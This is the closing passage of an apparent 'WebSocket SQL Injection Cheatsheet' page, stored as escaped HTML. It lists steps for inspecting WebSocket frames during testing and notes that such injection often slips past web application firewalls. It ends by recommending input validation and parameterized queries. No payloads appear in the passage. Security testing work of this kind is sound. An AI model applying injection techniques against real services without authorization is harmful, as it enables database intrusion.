class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 3. Filter by WS (WebSocket)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 4. Interact with application\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// 5. Analyze WebSocket frames\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cp\u003e\u003cem\u003eWebSocket SQL injection can be particularly dangerous as it often bypasses traditional web application firewalls. Always test WebSocket endpoints during security assessments and implement proper input validation and parameterized queries.\u003c/em\u003e\u003c/p\u003e","title":"WebSocket SQL Injection Cheatsheet"}]